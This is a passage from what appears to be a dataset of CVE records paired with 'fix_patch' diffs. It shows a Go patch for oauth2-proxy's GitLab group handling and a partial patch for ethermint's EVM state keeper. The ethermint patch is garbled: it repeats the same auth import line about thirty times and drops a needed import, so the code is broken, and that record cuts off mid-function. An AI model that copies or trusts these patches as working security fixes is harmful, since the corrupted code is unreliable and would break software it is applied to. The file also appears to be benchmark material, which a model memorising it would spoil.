mutation responses.\n+                        NumCounters: 10000,\n+                        // Allocate a max\n+                        MaxCost: int64(c.Cache.MaxCost),\n+                        // This is a best-practice value.\n+                        BufferItems: 64,\n+                })\n+\n+                a.tokenCache = cache\n+        }\n+\n+        return &c, client, nil\n }\n"}
{"cve":"CVE-2021-21411:0708", "fix_patch": "diff --git a/providers/gitlab.go b/providers/gitlab.go\nindex eb7c2ffa..0271938a 100644\n--- a/providers/gitlab.go\n+++ b/providers/gitlab.go\n@@ -1,364 +1,364 @@\n package providers\n \n import (\n-\t\"context\"\n-\t\"fmt\"\n-\t\"net/url\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/sessions\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/logger\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/requests\"\n-\t\"golang.org/x/oauth2\"\n+        \"context\"\n+        \"fmt\"\n+        \"net/url\"\n+        \"strconv\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/sessions\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/logger\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/requests\"\n+        \"golang.org/x/oauth2\"\n )\n \n // GitLabProvider represents a GitLab based Identity Provider\n type GitLabProvider struct {\n-\t*ProviderData\n+        *ProviderData\n \n-\tGroups   []string\n-\tProjects []*GitlabProject\n+        Groups   []string\n+        Projects []*GitlabProject\n }\n \n // GitlabProject represents a Gitlab project constraint entity\n type GitlabProject struct {\n-\tName        string\n-\tAccessLevel int\n+        Name        string\n+        AccessLevel int\n }\n \n // newGitlabProject Creates a new GitlabProject struct from project string formatted as namespace/project=accesslevel\n // if no accesslevel provided, use the default one\n func newGitlabproject(project string) (*GitlabProject, error) {\n-\t// default access level is 20\n-\tdefaultAccessLevel := 20\n-\t// see https://docs.gitlab.com/ee/api/members.html#valid-access-levels\n-\tvalidAccessLevel := [4]int{10, 20, 30, 40}\n+        // default access level is 20\n+        defaultAccessLevel := 20\n+        // see https://docs.gitlab.com/ee/api/members.html#valid-access-levels\n+        validAccessLevel := [4]int{10, 20, 30, 40}\n \n-\tparts := strings.SplitN(project, \"=\", 2)\n+        parts := strings.SplitN(project, \"=\", 2)\n \n-\tif len(parts) == 2 {\n-\t\tlvl, err := strconv.Atoi(parts[1])\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n+        if len(parts) == 2 {\n+                lvl, err := strconv.Atoi(parts[1])\n+                if err != nil {\n+                        return nil, err\n+                }\n \n-\t\tfor _, valid := range validAccessLevel {\n-\t\t\tif lvl == valid {\n-\t\t\t\treturn &GitlabProject{\n-\t\t\t\t\t\tName:        parts[0],\n-\t\t\t\t\t\tAccessLevel: lvl},\n-\t\t\t\t\terr\n-\t\t\t}\n-\t\t}\n+                for _, valid := range validAccessLevel {\n+                        if lvl == valid {\n+                                return &GitlabProject{\n+                                                Name:        parts[0],\n+                                                AccessLevel: lvl},\n+                                        err\n+                        }\n+                }\n \n-\t\treturn nil, fmt.Errorf(\"invalid gitlab project access level specified (%s)\", parts[0])\n+                return nil, fmt.Errorf(\"invalid gitlab project access level specified (%s)\", parts[0])\n \n-\t}\n+        }\n \n-\treturn &GitlabProject{\n-\t\t\tName:        project,\n-\t\t\tAccessLevel: defaultAccessLevel},\n-\t\tnil\n+        return &GitlabProject{\n+                        Name:        project,\n+                        AccessLevel: defaultAccessLevel},\n+                nil\n \n }\n \n var _ Provider = (*GitLabProvider)(nil)\n \n const (\n-\tgitlabProviderName = \"GitLab\"\n-\tgitlabDefaultScope = \"openid email\"\n+        gitlabProviderName = \"GitLab\"\n+        gitlabDefaultScope = \"openid email\"\n )\n \n // NewGitLabProvider initiates a new GitLabProvider\n func NewGitLabProvider(p *ProviderData) *GitLabProvider {\n-\tp.ProviderName = gitlabProviderName\n+        p.ProviderName = gitlabProviderName\n \n-\tif p.Scope == \"\" {\n-\t\tp.Scope = gitlabDefaultScope\n-\t}\n+        if p.Scope == \"\" {\n+                p.Scope = gitlabDefaultScope\n+        }\n \n-\treturn &GitLabProvider{ProviderData: p}\n+        return &GitLabProvider{ProviderData: p}\n }\n \n // Redeem exchanges the OAuth2 authentication token for an ID token\n func (p *GitLabProvider) Redeem(ctx context.Context, redirectURL, code string) (s *sessions.SessionState, err error) {\n-\tclientSecret, err := p.GetClientSecret()\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tc := oauth2.Config{\n-\t\tClientID:     p.ClientID,\n-\t\tClientSecret: clientSecret,\n-\t\tEndpoint: oauth2.Endpoint{\n-\t\t\tTokenURL: p.RedeemURL.String(),\n-\t\t},\n-\t\tRedirectURL: redirectURL,\n-\t}\n-\ttoken, err := c.Exchange(ctx, code)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"token exchange: %v\", err)\n-\t}\n-\ts, err = p.createSession(ctx, token)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"unable to update session: %v\", err)\n-\t}\n-\treturn\n+        clientSecret, err := p.GetClientSecret()\n+        if err != nil {\n+                return\n+        }\n+\n+        c := oauth2.Config{\n+                ClientID:     p.ClientID,\n+                ClientSecret: clientSecret,\n+                Endpoint: oauth2.Endpoint{\n+                        TokenURL: p.RedeemURL.String(),\n+                },\n+                RedirectURL: redirectURL,\n+        }\n+        token, err := c.Exchange(ctx, code)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"token exchange: %v\", err)\n+        }\n+        s, err = p.createSession(ctx, token)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"unable to update session: %v\", err)\n+        }\n+        return\n }\n \n // SetProjectScope ensure read_api is added to scope when filtering on projects\n func (p *GitLabProvider) SetProjectScope() {\n-\tif len(p.Projects) > 0 {\n-\t\tfor _, val := range strings.Split(p.Scope, \" \") {\n-\t\t\tif val == \"read_api\" {\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t}\n-\t\tp.Scope += \" read_api\"\n-\t}\n+        if len(p.Projects) > 0 {\n+                for _, val := range strings.Split(p.Scope, \" \") {\n+                        if val == \"read_api\" {\n+                                return\n+                        }\n+\n+                }\n+                p.Scope += \" read_api\"\n+        }\n }\n \n // RefreshSessionIfNeeded checks if the session has expired and uses the\n // RefreshToken to fetch a new ID token if required\n func (p *GitLabProvider) RefreshSessionIfNeeded(ctx context.Context, s *sessions.SessionState) (bool, error) {\n-\tif s == nil || (s.ExpiresOn != nil && s.ExpiresOn.After(time.Now())) || s.RefreshToken == \"\" {\n-\t\treturn false, nil\n-\t}\n+        if s == nil || (s.ExpiresOn != nil && s.ExpiresOn.After(time.Now())) || s.RefreshToken == \"\" {\n+                return false, nil\n+        }\n \n-\torigExpiration := s.ExpiresOn\n+        origExpiration := s.ExpiresOn\n \n-\terr := p.redeemRefreshToken(ctx, s)\n-\tif err != nil {\n-\t\treturn false, fmt.Errorf(\"unable to redeem refresh token: %v\", err)\n-\t}\n+        err := p.redeemRefreshToken(ctx, s)\n+        if err != nil {\n+                return false, fmt.Errorf(\"unable to redeem refresh token: %v\", err)\n+        }\n \n-\tlogger.Printf(\"refreshed id token %s (expired on %s)\\n\", s, origExpiration)\n-\treturn true, nil\n+        logger.Printf(\"refreshed id token %s (expired on %s)\\n\", s, origExpiration)\n+        return true, nil\n }\n \n func (p *GitLabProvider) redeemRefreshToken(ctx context.Context, s *sessions.SessionState) (err error) {\n-\tclientSecret, err := p.GetClientSecret()\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tc := oauth2.Config{\n-\t\tClientID:     p.ClientID,\n-\t\tClientSecret: clientSecret,\n-\t\tEndpoint: oauth2.Endpoint{\n-\t\t\tTokenURL: p.RedeemURL.String(),\n-\t\t},\n-\t}\n-\tt := &oauth2.Token{\n-\t\tRefreshToken: s.RefreshToken,\n-\t\tExpiry:       time.Now().Add(-time.Hour),\n-\t}\n-\ttoken, err := c.TokenSource(ctx, t).Token()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"failed to get token: %v\", err)\n-\t}\n-\tnewSession, err := p.createSession(ctx, token)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to update session: %v\", err)\n-\t}\n-\ts.AccessToken = newSession.AccessToken\n-\ts.IDToken = newSession.IDToken\n-\ts.RefreshToken = newSession.RefreshToken\n-\ts.CreatedAt = newSession.CreatedAt\n-\ts.ExpiresOn = newSession.ExpiresOn\n-\ts.Email = newSession.Email\n-\treturn\n+        clientSecret, err := p.GetClientSecret()\n+        if err != nil {\n+                return\n+        }\n+\n+        c := oauth2.Config{\n+                ClientID:     p.ClientID,\n+                ClientSecret: clientSecret,\n+                Endpoint: oauth2.Endpoint{\n+                        TokenURL: p.RedeemURL.String(),\n+                },\n+        }\n+        t := &oauth2.Token{\n+                RefreshToken: s.RefreshToken,\n+                Expiry:       time.Now().Add(-time.Hour),\n+        }\n+        token, err := c.TokenSource(ctx, t).Token()\n+        if err != nil {\n+                return fmt.Errorf(\"failed to get token: %v\", err)\n+        }\n+        newSession, err := p.createSession(ctx, token)\n+        if err != nil {\n+                return fmt.Errorf(\"unable to update session: %v\", err)\n+        }\n+        s.AccessToken = newSession.AccessToken\n+        s.IDToken = newSession.IDToken\n+        s.RefreshToken = newSession.RefreshToken\n+        s.CreatedAt = newSession.CreatedAt\n+        s.ExpiresOn = newSession.ExpiresOn\n+        s.Email = newSession.Email\n+        return\n }\n \n type gitlabUserInfo struct {\n-\tUsername      string   `json:\"nickname\"`\n-\tEmail         string   `json:\"email\"`\n-\tEmailVerified bool     `json:\"email_verified\"`\n-\tGroups        []string `json:\"groups\"`\n+        Username      string   `json:\"nickname\"`\n+        Email         string   `json:\"email\"`\n+        EmailVerified bool     `json:\"email_verified\"`\n+        Groups        []string `json:\"groups\"`\n }\n \n func (p *GitLabProvider) getUserInfo(ctx context.Context, s *sessions.SessionState) (*gitlabUserInfo, error) {\n-\t// Retrieve user info JSON\n-\t// https://docs.gitlab.com/ee/integration/openid_connect_provider.html#shared-information\n-\n-\t// Build user info url from login url of GitLab instance\n-\tuserInfoURL := *p.LoginURL\n-\tuserInfoURL.Path = \"/oauth/userinfo\"\n-\n-\tvar userInfo gitlabUserInfo\n-\terr := requests.New(userInfoURL.String()).\n-\t\tWithContext(ctx).\n-\t\tSetHeader(\"Authorization\", \"Bearer \"+s.AccessToken).\n-\t\tDo().\n-\t\tUnmarshalInto(&userInfo)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting user info: %v\", err)\n-\t}\n-\n-\treturn &userInfo, nil\n+        // Retrieve user info JSON\n+        // https://docs.gitlab.com/ee/integration/openid_connect_provider.html#shared-information\n+\n+        // Build user info url from login url of GitLab instance\n+        userInfoURL := *p.LoginURL\n+        userInfoURL.Path = \"/oauth/userinfo\"\n+\n+        var userInfo gitlabUserInfo\n+        err := requests.New(userInfoURL.String()).\n+                WithContext(ctx).\n+                SetHeader(\"Authorization\", \"Bearer \"+s.AccessToken).\n+                Do().\n+                UnmarshalInto(&userInfo)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting user info: %v\", err)\n+        }\n+\n+        return &userInfo, nil\n }\n \n type gitlabPermissionAccess struct {\n-\tAccessLevel int `json:\"access_level\"`\n+        AccessLevel int `json:\"access_level\"`\n }\n \n type gitlabProjectPermission struct {\n-\tProjectAccess *gitlabPermissionAccess `json:\"project_access\"`\n-\tGroupAccess   *gitlabPermissionAccess `json:\"group_access\"`\n+        ProjectAccess *gitlabPermissionAccess `json:\"project_access\"`\n+        GroupAccess   *gitlabPermissionAccess `json:\"group_access\"`\n }\n \n type gitlabProjectInfo struct {\n-\tName              string                  `json:\"name\"`\n-\tArchived          bool                    `json:\"archived\"`\n-\tPathWithNamespace string                  `json:\"path_with_namespace\"`\n-\tPermissions       gitlabProjectPermission `json:\"permissions\"`\n+        Name              string                  `json:\"name\"`\n+        Archived          bool                    `json:\"archived\"`\n+        PathWithNamespace string                  `json:\"path_with_namespace\"`\n+        Permissions       gitlabProjectPermission `json:\"permissions\"`\n }\n \n func (p *GitLabProvider) getProjectInfo(ctx context.Context, s *sessions.SessionState, project string) (*gitlabProjectInfo, error) {\n-\tvar projectInfo gitlabProjectInfo\n+        var projectInfo gitlabProjectInfo\n \n-\tendpointURL := &url.URL{\n-\t\tScheme: p.LoginURL.Scheme,\n-\t\tHost:   p.LoginURL.Host,\n-\t\tPath:   \"/api/v4/projects/\",\n-\t}\n+        endpointURL := &url.URL{\n+                Scheme: p.LoginURL.Scheme,\n+                Host:   p.LoginURL.Host,\n+                Path:   \"/api/v4/projects/\",\n+        }\n \n-\terr := requests.New(fmt.Sprintf(\"%s%s\", endpointURL.String(), url.QueryEscape(project))).\n-\t\tWithContext(ctx).\n-\t\tSetHeader(\"Authorization\", \"Bearer \"+s.AccessToken).\n-\t\tDo().\n-\t\tUnmarshalInto(&projectInfo)\n+        err := requests.New(fmt.Sprintf(\"%s%s\", endpointURL.String(), url.QueryEscape(project))).\n+                WithContext(ctx).\n+                SetHeader(\"Authorization\", \"Bearer \"+s.AccessToken).\n+                Do().\n+                UnmarshalInto(&projectInfo)\n \n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get project info: %v\", err)\n-\t}\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to get project info: %v\", err)\n+        }\n \n-\treturn &projectInfo, nil\n+        return &projectInfo, nil\n }\n \n // AddProjects adds Gitlab projects from options to GitlabProvider struct\n func (p *GitLabProvider) AddProjects(projects []string) error {\n-\tfor _, project := range projects {\n-\t\tgp, err := newGitlabproject(project)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n+        for _, project := range projects {\n+                gp, err := newGitlabproject(project)\n+                if err != nil {\n+                        return err\n+                }\n \n-\t\tp.Projects = append(p.Projects, gp)\n-\t}\n+                p.Projects = append(p.Projects, gp)\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n func (p *GitLabProvider) createSession(ctx context.Context, token *oauth2.Token) (*sessions.SessionState, error) {\n-\tidToken, err := p.verifyIDToken(ctx, token)\n-\tif err != nil {\n-\t\tswitch err {\n-\t\tcase ErrMissingIDToken:\n-\t\t\treturn nil, fmt.Errorf(\"token response did not contain an id_token\")\n-\t\tdefault:\n-\t\t\treturn nil, fmt.Errorf(\"could not verify id_token: %v\", err)\n-\t\t}\n-\t}\n-\n-\tcreated := time.Now()\n-\treturn &sessions.SessionState{\n-\t\tAccessToken:  token.AccessToken,\n-\t\tIDToken:      getIDToken(token),\n-\t\tRefreshToken: token.RefreshToken,\n-\t\tCreatedAt:    &created,\n-\t\tExpiresOn:    &idToken.Expiry,\n-\t}, nil\n+        idToken, err := p.verifyIDToken(ctx, token)\n+        if err != nil {\n+                switch err {\n+                case ErrMissingIDToken:\n+                        return nil, fmt.Errorf(\"token response did not contain an id_token\")\n+                default:\n+                        return nil, fmt.Errorf(\"could not verify id_token: %v\", err)\n+                }\n+        }\n+\n+        created := time.Now()\n+        return &sessions.SessionState{\n+                AccessToken:  token.AccessToken,\n+                IDToken:      getIDToken(token),\n+                RefreshToken: token.RefreshToken,\n+                CreatedAt:    &created,\n+                ExpiresOn:    &idToken.Expiry,\n+        }, nil\n }\n \n // ValidateSession checks that the session's IDToken is still valid\n func (p *GitLabProvider) ValidateSession(ctx context.Context, s *sessions.SessionState) bool {\n-\t_, err := p.Verifier.Verify(ctx, s.IDToken)\n-\treturn err == nil\n+        _, err := p.Verifier.Verify(ctx, s.IDToken)\n+        return err == nil\n }\n \n // EnrichSession adds values and data from the Gitlab endpoint to current session\n func (p *GitLabProvider) EnrichSession(ctx context.Context, s *sessions.SessionState) error {\n-\t// Retrieve user info\n-\tuserInfo, err := p.getUserInfo(ctx, s)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"failed to retrieve user info: %v\", err)\n-\t}\n+        // Retrieve user info\n+        userInfo, err := p.getUserInfo(ctx, s)\n+        if err != nil {\n+                return fmt.Errorf(\"failed to retrieve user info: %v\", err)\n+        }\n \n-\t// Check if email is verified\n-\tif !p.AllowUnverifiedEmail && !userInfo.EmailVerified {\n-\t\treturn fmt.Errorf(\"user email is not verified\")\n-\t}\n+        // Check if email is verified\n+        if !p.AllowUnverifiedEmail && !userInfo.EmailVerified {\n+                return fmt.Errorf(\"user email is not verified\")\n+        }\n \n-\ts.User = userInfo.Username\n-\ts.Email = userInfo.Email\n+        s.User = userInfo.Username\n+        s.Email = userInfo.Email\n \n-\tp.addGroupsToSession(ctx, s)\n+        p.addGroupsToSession(s, userInfo)\n \n-\tp.addProjectsToSession(ctx, s)\n+        p.addProjectsToSession(ctx, s)\n \n-\treturn nil\n+        return nil\n \n }\n \n // addGroupsToSession projects into session.Groups\n-func (p *GitLabProvider) addGroupsToSession(ctx context.Context, s *sessions.SessionState) {\n-\t// Iterate over projects, check if oauth2-proxy can get project information on behalf of the user\n-\tfor _, group := range p.Groups {\n-\t\ts.Groups = append(s.Groups, fmt.Sprintf(\"group:%s\", group))\n-\t}\n+func (p *GitLabProvider) addGroupsToSession(s *sessions.SessionState, userInfo *gitlabUserInfo) {\n+        // Iterate over projects, check if oauth2-proxy can get project information on behalf of the user\n+        for _, group := range userInfo.Groups {\n+                s.Groups = append(s.Groups, fmt.Sprintf(\"group:%s\", group))\n+        }\n }\n \n // addProjectsToSession adds projects matching user access requirements into the session state groups list\n // This method prefix projects names with `project` to specify group kind\n func (p *GitLabProvider) addProjectsToSession(ctx context.Context, s *sessions.SessionState) {\n-\t// Iterate over projects, check if oauth2-proxy can get project information on behalf of the user\n-\tfor _, project := range p.Projects {\n-\t\tprojectInfo, err := p.getProjectInfo(ctx, s, project.Name)\n-\n-\t\tif err != nil {\n-\t\t\tlogger.Errorf(\"Warning: project info request failed: %v\", err)\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif !projectInfo.Archived {\n-\t\t\tperms := projectInfo.Permissions.ProjectAccess\n-\t\t\tif perms == nil {\n-\t\t\t\t// use group project access as fallback\n-\t\t\t\tperms = projectInfo.Permissions.GroupAccess\n-\t\t\t\t// group project access is not set for this user then we give up\n-\t\t\t\tif perms == nil {\n-\t\t\t\t\tlogger.Errorf(\"Warning: user %q has no project level access to %s\", s.Email, project.Name)\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\tif perms != nil && perms.AccessLevel >= project.AccessLevel {\n-\t\t\t\ts.Groups = append(s.Groups, fmt.Sprintf(\"project:%s\", project.Name))\n-\t\t\t} else {\n-\t\t\t\tlogger.Errorf(\"Warning: user %q does not have the minimum required access level for project %q\", s.Email, project.Name)\n-\t\t\t}\n-\t\t} else {\n-\t\t\tlogger.Errorf(\"Warning: project %s is archived\", project.Name)\n-\t\t}\n-\n-\t}\n+        // Iterate over projects, check if oauth2-proxy can get project information on behalf of the user\n+        for _, project := range p.Projects {\n+                projectInfo, err := p.getProjectInfo(ctx, s, project.Name)\n+\n+                if err != nil {\n+                        logger.Errorf(\"Warning: project info request failed: %v\", err)\n+                        continue\n+                }\n+\n+                if !projectInfo.Archived {\n+                        perms := projectInfo.Permissions.ProjectAccess\n+                        if perms == nil {\n+                                // use group project access as fallback\n+                                perms = projectInfo.Permissions.GroupAccess\n+                                // group project access is not set for this user then we give up\n+                                if perms == nil {\n+                                        logger.Errorf(\"Warning: user %q has no project level access to %s\", s.Email, project.Name)\n+                                        continue\n+                                }\n+                        }\n+\n+                        if perms != nil && perms.AccessLevel >= project.AccessLevel {\n+                                s.Groups = append(s.Groups, fmt.Sprintf(\"project:%s\", project.Name))\n+                        } else {\n+                                logger.Errorf(\"Warning: user %q does not have the minimum required access level for project %q\", s.Email, project.Name)\n+                        }\n+                } else {\n+                        logger.Errorf(\"Warning: project %s is archived\", project.Name)\n+                }\n+\n+        }\n \n }\n \n // PrefixAllowedGroups returns a list of allowed groups, prefixed by their `kind` value\n func (p *GitLabProvider) PrefixAllowedGroups() (groups []string) {\n \n-\tfor _, val := range p.Groups {\n-\t\tgroups = append(groups, fmt.Sprintf(\"group:%s\", val))\n-\t}\n+        for _, val := range p.Groups {\n+                groups = append(groups, fmt.Sprintf(\"group:%s\", val))\n+        }\n \n-\tfor _, val := range p.Projects {\n-\t\tgroups = append(groups, fmt.Sprintf(\"project:%s\", val.Name))\n-\t}\n+        for _, val := range p.Projects {\n+                groups = append(groups, fmt.Sprintf(\"project:%s\", val.Name))\n+        }\n \n-\treturn groups\n+        return groups\n }\n"}
{"cve":"CVE-2022-35936:0708", "fix_patch": "diff --git a/x/evm/keeper/statedb.go b/x/evm/keeper/statedb.go\nindex a70d1427..75af657c 100644\n--- a/x/evm/keeper/statedb.go\n+++ b/x/evm/keeper/statedb.go\n@@ -1,17 +1,51 @@\n package keeper\n \n import (\n-\t\"bytes\"\n-\t\"fmt\"\n-\t\"math/big\"\n-\n-\t\"github.com/cosmos/cosmos-sdk/store/prefix\"\n-\tsdk \"github.com/cosmos/cosmos-sdk/types\"\n-\tsdkerrors \"github.com/cosmos/cosmos-sdk/types/errors\"\n-\t\"github.com/ethereum/go-ethereum/common\"\n-\tethermint \"github.com/evmos/ethermint/types\"\n-\t\"github.com/evmos/ethermint/x/evm/statedb\"\n-\t\"github.com/evmos/ethermint/x/evm/types\"\n+        \"bytes\"\n+        \"fmt\"\n+        \"math/big\"\n+\n+        \"github.com/cosmos/cosmos-sdk/store/prefix\"\n+        sdk \"github.com/cosmos/cosmos-sdk/types\"\n+        sdkerrors \"github.com/cosmos/cosmos-sdk/types/errors\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+        authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+\n+authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+        \"github.com/ethereum/go-ethereum/common\"\n+        authtypes \"github.com/cosmos/cosmos-sdk/x/auth/types\"\n+        \"github.com/evmos/ethermint/x/evm/statedb\"\n+        \"github.com/evmos/ethermint/x/evm/types\"\n )\n \n var _ statedb.Keeper = &Keeper{}\n@@ -22,155 +56,155 @@ var _ statedb.Keeper = &Keeper{}\n \n // GetAccount returns nil if account is not exist, returns error if it's not `EthAccountI`\n func (k *Keeper) GetAccount(ctx sdk.Context, addr common.Address) *statedb.Account {\n-\tacct := k.GetAccountWithoutBalance(ctx, addr)\n-\tif acct == nil {\n-\t\treturn nil\n-\t}\n+        acct := k.GetAccountWithoutBalance(ctx, addr)\n+        if acct == nil {\n+                return nil\n+        }\n \n-\tacct.Balance = k.GetBalance(ctx, addr)\n-\treturn acct\n+        acct.Balance = k.GetBalance(ctx, addr)\n+        return acct\n }\n \n // GetState loads contract state from database, implements `statedb.Keeper` interface.\n func (k *Keeper) GetState(ctx sdk.Context, addr common.Address, key common.Hash) common.Hash {\n-\tstore := prefix.NewStore(ctx.KVStore(k.storeKey), types.AddressStoragePrefix(addr))\n+        store := prefix.NewStore(ctx.KVStore(k.storeKey), types.AddressStoragePrefix(addr))\n \n-\tvalue := store.Get(key.Bytes())\n-\tif len(value) == 0 {\n-\t\treturn common.Hash{}\n-\t}\n+        value := store.Get(key.Bytes())\n+        if len(value) == 0 {\n+                return common.Hash{}\n+        }\n \n-\treturn common.BytesToHash(value)\n+        return common.BytesToHash(value)\n }\n \n // GetCode loads contract code from database, implements `statedb.Keeper` interface.\n func (k *Keeper) GetCode(ctx sdk.Context, codeHash common.Hash) []byte {\n-\tstore := prefix.NewStore(ctx.KVStore(k.storeKey), types.KeyPrefixCode)\n-\treturn store.Get(codeHash.Bytes())\n+        store := prefix.NewStore(ctx.KVStore(k.storeKey), types.KeyPrefixCode)\n+        return store.Get(codeHash.Bytes())\n }\n \n // ForEachStorage iterate contract storage, callback return false to break early\n func (k *Keeper) ForEachStorage(ctx sdk.Context, addr common.Address, cb func(key, value common.Hash) bool) {\n-\tstore := ctx.KVStore(k.storeKey)\n-\tprefix := types.AddressStoragePrefix(addr)\n+        store := ctx.KVStore(k.storeKey)\n+        prefix := types.AddressStoragePrefix(addr)\n \n-\titerator := sdk.KVStorePrefixIterator(store, prefix)\n-\tdefer iterator.Close()\n+        iterator := sdk.KVStorePrefixIterator(store, prefix)\n+        defer iterator.Close()\n \n-\tfor ; iterator.Valid(); iterator.Next() {\n-\t\tkey := common.BytesToHash(iterator.Key())\n-\t\tvalue := common.BytesToHash(iterator.Value())\n+        for ; iterator.Valid(); iterator.Next() {\n+                key := common.BytesToHash(iterator.Key())\n+                value := common.BytesToHash(iterator.Value())\n \n-\t\t// check if iteration stops\n-\t\tif !cb(key, value) {\n-\t\t\treturn\n-\t\t}\n-\t}\n+                // check if iteration stops\n+                if !cb(key, value) {\n+                        return\n+                }\n+        }\n }\n \n // SetBalance update account's balance, compare with current balance first, then decide to mint or burn.\n func (k *Keeper) SetBalance(ctx sdk.Context, addr common.Address, amount *big.Int) error {\n-\tcosmosAddr := sdk.AccAddress(addr.Bytes())\n-\n-\tparams := k.GetParams(ctx)\n-\tcoin := k.bankKeeper.GetBalance(ctx, cosmosAddr, params.EvmDenom)\n-\tbalance := coin.Amount.BigInt()\n-\tdelta := new(big.Int).Sub(amount, balance)\n-\tswitch delta.Sign() {\n-\tcase 1:\n-\t\t// mint\n-\t\tcoins := sdk.NewCoins(sdk.NewCoin(params.EvmDenom, sdk.NewIntFromBigInt(delta)))\n-\t\tif err := k.bankKeeper.MintCoins(ctx, types.ModuleName, coins); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tif err := k.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, cosmosAddr, coins); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\tcase -1:\n-\t\t// burn\n-\t\tcoins := sdk.NewCoins(sdk.NewCoin(params.EvmDenom, sdk.NewIntFromBigInt(new(big.Int).Neg(delta))))\n-\t\tif err := k.bankKeeper.SendCoinsFromAccountToModule(ctx, cosmosAddr, types.ModuleName, coins); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tif err := k.bankKeeper.BurnCoins(ctx, types.ModuleName, coins); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\tdefault:\n-\t\t// not changed\n-\t}\n-\treturn nil\n+        cosmosAddr := sdk.AccAddress(addr.Bytes())\n+\n+        params := k.GetParams(ctx)\n+        coin := k.bankKeeper.GetBalance(ctx, cosmosAddr, params.EvmDenom)\n+        balance := coin.Amount.BigInt()\n+        delta := new(big.Int).Sub(amount, balance)\n+        switch delta.Sign() {\n+        case 1:\n+                // mint\n+                coins := sdk.NewCoins(sdk.NewCoin(params.EvmDenom, sdk.NewIntFromBigInt(delta)))\n+                if err := k.bankKeeper.MintCoins(ctx, types.ModuleName, coins); err != nil {\n+                        return err\n+                }\n+                if err := k.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, cosmosAddr, coins); err != nil {\n+                        return err\n+                }\n+        case -1:\n+                // burn\n+                coins := sdk.NewCoins(sdk.NewCoin(params.EvmDenom, sdk.NewIntFromBigInt(new(big.Int).Neg(delta))))\n+                if err := k.bankKeeper.SendCoinsFromAccountToModule(ctx, cosmosAddr, types.ModuleName, coins); err != nil {\n+                        return err\n+                }\n+                if err := k.bankKeeper.BurnCoins(ctx, types.ModuleName, coins); err != nil {\n+                        return err\n+                }\n+        default:\n+                // not changed\n+        }\n+        return nil\n }\n \n // SetAccount updates nonce/balance/codeHash together.\n func (k *Keeper) SetAccount(ctx sdk.Context, addr common.Address, account statedb.Account) error {\n-\t// update account\n-\tcosmosAddr := sdk.AccAddress(addr.Bytes())\n-\tacct := 